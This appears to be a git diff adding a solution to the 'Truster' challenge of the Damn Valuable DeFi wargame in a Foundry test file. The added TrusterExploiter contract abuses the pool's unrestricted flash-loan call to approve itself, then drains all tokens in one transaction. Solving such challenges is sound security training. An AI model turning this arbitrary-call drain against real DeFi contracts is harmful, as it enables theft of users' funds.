@@ -51,8 +51,11 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        /* Deploy and exploit the vulnerability, 
+           per new contract exploit code at end of file */
+        new TrusterExploiter(pool, token, recovery);
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -66,3 +69,28 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
 }
+
+/**
+ * @notice Exploit contract to drain all DVT tokens from TrusterLenderPool in a single transaction
+ * @dev Leverages the unrestricted `functionCall` in flashLoan to approve and transfer tokens
+ * @param _pool Instance of the TrusterLenderPool being exploited
+ * @param _token Instance of the DamnValuableToken managed by the pool
+ * @param _recovery Target address to receive all stolen tokens
+ */
+contract TrusterExploiter {
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+        // Encode call to approve this contract to spend all tokens held by the pool
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            _token.balanceOf(address(_pool))
+        );
+
+        // Trigger flash loan with zero amount, using encoded approval as payload
+        // This forces the pool to approve this contract as spender for all its tokens
+        _pool.flashLoan(0, address(this), address(_token), data);
+
+        // Immediately transfer all approved tokens from pool to recovery address
+        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
+    }
+}   
